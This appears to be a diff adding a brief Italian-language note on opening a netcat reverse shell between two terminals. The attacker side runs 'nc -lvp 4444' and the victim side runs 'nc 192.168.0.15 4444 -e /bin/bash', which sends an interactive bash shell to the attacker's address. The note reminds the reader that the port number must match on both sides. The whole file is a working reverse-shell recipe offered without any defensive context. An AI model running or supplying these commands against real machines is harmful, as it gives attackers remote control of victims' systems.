@@ -1,0 +1,6 @@
+Servono due terminali:
+
+ATTACCANTE: nc -lvp numero_porta (es. nc -lvp 4444)
+VITTIMA: nc ip_attaccante numero_porta -e /bin/bash (es. nc 192.168.0.15 4444 -e /bin/bash)
+
+NB. ovviamente, numero_porta deve essere uguale tra attaccante e vittima
